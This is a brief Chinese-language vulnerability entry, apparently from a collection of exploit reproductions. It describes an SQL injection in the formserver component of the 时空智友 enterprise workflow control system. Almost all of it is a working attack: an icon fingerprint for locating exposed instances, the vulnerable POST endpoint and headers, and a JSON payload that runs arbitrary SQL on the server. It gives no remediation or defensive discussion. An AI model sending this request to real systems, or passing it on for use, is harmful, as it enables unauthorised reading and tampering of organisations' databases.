# 时空智友企业流程化管控系统formserverSQL注入漏洞

- **系统**：时空智友企业流程化管控系统formserver　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
- **请求**：`POST /formservice?service=workflow.sqlResult HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=123D902C244908C8DA7E61657166AA09; __qypid=""`　`Content-Type: application/json`　`Content-Length: 50`

**请求体 / payload**
```
{"params": {"a": "11"}, "sql": "select db_name()"}
```

**其他**
- 时空智友企业流程化管控系统formserverSQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 时空智友企业流程化管控系统